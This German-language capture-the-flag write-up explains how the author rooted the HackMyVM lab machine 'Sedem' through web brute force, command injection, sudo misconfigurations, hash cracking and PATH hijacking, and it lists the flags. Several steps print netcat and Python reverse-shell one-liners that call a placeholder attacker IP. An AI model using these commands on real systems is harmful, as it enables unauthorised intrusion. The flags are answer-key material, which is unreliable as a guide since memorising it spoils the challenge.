# Sedem - HackMyVM (Medium)

![Sedem.png](Sedem.png)

## Übersicht

*   **VM:** Sedem
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Sedem)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 1. Oktober 2022
*   **Original-Writeup:** https://alientec1908.github.io/Sedem_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Sedem" zu erlangen. Der Weg dorthin begann mit der Entdeckung eines `/sysadmin`-Verzeichnisses auf dem Webserver. Nach erfolgreichem Brute-Force-Login (`admin:fucker1`) in den Admin-Bereich wurde eine Command Injection-Schwachstelle im Parameter `mission` der Seite `/sysadmin/system/` gefunden. Dies ermöglichte eine Reverse Shell als `www-data`. Die erste Rechteausweitung zum Benutzer `user1` gelang durch Ausnutzung einer `sudo`-Regel, die `www-data` erlaubte, `/usr/sbin/pppdump` als `user1` auszuführen, um dessen SSH-Schlüssel in Hex-Form zu extrahieren. Nach Dekodierung des Schlüssels wurde SSH-Zugriff als `user1` erlangt. Die nächste Eskalation zu `user2` erfolgte durch Ausnutzung einer weiteren `sudo`-Regel, die `user1` erlaubte, ein Python-Skript (`/home/user2/socket/code.py`) als `user2` auszuführen. Durch Senden eines Reverse-Shell-Befehls über einen UNIX-Socket, auf den das Skript lauschte, wurde eine Shell als `user2` erhalten. Für `user3` wurde ein Whirlpool-Passwort-Hash in `/home/user3/.privacy.txt` gefunden, der zu `nopassword` geknackt wurde. Die finale Eskalation zu Root erfolgte durch PATH-Hijacking. Das SUID/SGID-Root-Programm `/opt/check` rief den Befehl `service` ohne absoluten Pfad auf. Durch Erstellen einer bösartigen `service`-Datei in `/tmp` und Manipulation der `PATH`-Variable wurde diese als Root ausgeführt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `wget`
*   `stegseek` (versucht)
*   `stegsnow` (versucht)
*   `exiftool` (versucht)
*   `nikto`
*   `wfuzz`
*   Burp Suite (impliziert)
*   Python (für Reverse Shell Payload)
*   `nc` (netcat)
*   Python3 (`pty` Modul)
*   `sudo`
*   `pppdump`
*   CyberChef (extern, für Hex-Dekodierung)
*   `ssh`
*   `socat`
*   Crackstation (extern, für Hash-Crack)
*   Standard Linux-Befehle (`cat`, `echo`, `chmod`, `export`, `strings`, `vi`, `find`, `ls`, `id`, `su`, `mkdir`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Sedem" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.107 – Abweichung vom ARP-Scan, der .138 fand) identifiziert. Hostname `sedem.hmv` in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 7.9p1) und Port 80 (HTTP, Apache 2.4.38).
    *   `gobuster` fand u.a. `/sysadmin/`. Steganographie-Versuche auf `image.jpg` (von `/`) blieben erfolglos.
    *   Zugriff auf `/sysadmin/` war zunächst verboten (403). `gobuster` auf `/sysadmin/` fand `/include/header.php` und `footer.php`.
    *   LFI-Versuche mit `wfuzz` auf `index.php` und `footer.php` im `/sysadmin`-Verzeichnis scheiterten.
    *   Mittels Brute-Force (Burp Suite) auf das Login-Formular von `/sysadmin/index.php` wurden die Credentials `admin:fucker1` gefunden.
    *   Nach dem Login wurde im Bereich `/sysadmin/system/` eine Command Injection-Schwachstelle im GET-Parameter `mission` entdeckt (`?mission=id`).

2.  **Initial Access (RCE als `www-data`):**
    *   Die Command Injection-Schwachstelle (`?mission=`) wurde genutzt, um eine Python-Reverse-Shell auszuführen: `python -c 'import socket,subprocess,os;s=socket.socket(...);s.connect(("ANGRIFFS_IP",4444));os.dup2(...);import pty; pty.spawn("/bin/sh")'`.
    *   Eine Reverse Shell als `www-data` wurde auf einem Netcat-Listener (Port 4444) empfangen und stabilisiert.

3.  **Privilege Escalation (von `www-data` zu `user1` via `sudo pppdump` & SSH Key):**
    *   `sudo -l` als `www-data` zeigte, dass `/usr/sbin/pppdump` als `user1` ohne Passwort ausgeführt werden durfte.
    *   Mittels `sudo -u user1 /usr/sbin/pppdump /home/user1/.ssh/id_rsa` wurde der private SSH-Schlüssel von `user1` als Hex-String ausgegeben.
    *   Der Hex-String wurde mit CyberChef dekodiert und der private Schlüssel gespeichert.
    *   Erfolgreicher SSH-Login als `user1` mit dem extrahierten Schlüssel.
    *   Die User-Flag (`Hegumlam`) wurde in `/srv/ftp/user.txt` gefunden (lesbar als `user1` oder `user2`).

4.  **Privilege Escalation (von `user1` zu `user2` via `sudo python` & Socket):**
    *   `sudo -l` als `user1` zeigte (impliziert), dass `/usr/bin/python /home/user2/socket/code.py` als `user2` ausgeführt werden durfte.
    *   Das Python-Skript `code.py` lauschte auf einem UNIX-Socket (`/home/user2/socket/socket_test.s`) und führte empfangene Befehle aus.
    *   Mittels `echo 'nc ANGRIFFS_IP 3333 -e "/bin/bash"' | socat - UNIX-CLIENT:/home/user2/socket/socket_test.s` wurde ein Reverse-Shell-Befehl an den Socket gesendet.
    *   Eine Reverse Shell als `user2` wurde auf einem Netcat-Listener (Port 3333) empfangen.

5.  **Privilege Escalation (von `user2` zu `user3` via Hash Crack):**
    *   Als `user2` wurde in `/home/user3/.privacy.txt` ein langer Hex-String gefunden: `651d...7ee`.
    *   Crackstation identifizierte diesen als Whirlpool-Hash und knackte ihn zu `nopassword`.
    *   Mit `su user3` und dem Passwort `nopassword` wurde zu `user3` gewechselt.

6.  **Privilege Escalation (von `user3` zu `root` via PATH Hijacking):**
    *   Als `user3` wurde die SUID/SGID-Root-Datei `/opt/check` gefunden.
    *   `strings /opt/check` zeigte, dass das Programm den Befehl `service apache2 status` ausführt, aber `service` ohne absoluten Pfad aufruft.
    *   Im beschreibbaren Verzeichnis `/tmp` wurde eine bösartige Datei namens `service` erstellt (`echo 'nc ANGRIFFS_IP 5555 -e "/bin/bash"' > /tmp/service; chmod +x /tmp/service`).
    *   Die `PATH`-Variable wurde manipuliert: `export PATH=/tmp:$PATH`.
    *   Durch Ausführen von `/opt/check` wurde nun `/tmp/service` (die Reverse Shell) als Root ausgeführt.
    *   Eine Root-Shell wurde auf einem Netcat-Listener (Port 5555) empfangen.
    *   Die Root-Flag (`Thicolgim`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Web-Login Brute-Force:** Erfolgreiches Erraten von Admin-Credentials für `/sysadmin/`.
*   **Command Injection:** Eine Webanwendung im Admin-Bereich (`/sysadmin/system/`) war anfällig für Command Injection über den `mission`-Parameter.
*   **Unsichere `sudo`-Regeln:**
    *   `www-data` durfte `pppdump` als `user1` ausführen, was das Lesen von `user1`s SSH-Schlüssel ermöglichte.
    *   `user1` durfte ein Python-Skript als `user2` ausführen, das unsicher Daten von einem UNIX-Socket verarbeitete.
*   **Klartextpasswörter/Schwache Hashes in Dateien:** Ein Whirlpool-Hash für `user3` wurde in einer Textdatei gefunden und konnte geknackt werden.
*   **SUID-Binary mit PATH Hijacking:** Ein SUID/SGID-Root-Programm (`/opt/check`) rief einen Systembefehl (`service`) ohne absoluten Pfad auf, was PATH-Manipulation und Ausführung eines bösartigen Skripts als Root ermöglichte.
*   **Informationslecks:** PHP-Include-Dateien waren direkt zugänglich (aber nicht direkt ausnutzbar für LFI).

## Flags

*   **User Flag (`/srv/ftp/user.txt`):** `Hegumlam`
*   **Root Flag (`/root/root.txt`):** `Thicolgim`

## Tags

`HackMyVM`, `Sedem`, `Medium`, `Web Brute-Force`, `Command Injection`, `sudo Exploit`, `pppdump`, `UNIX Socket Exploit`, `Hash Cracking`, `Whirlpool`, `SUID Exploit`, `PATH Hijacking`, `Linux`, `Web`, `Privilege Escalation`, `Apache`
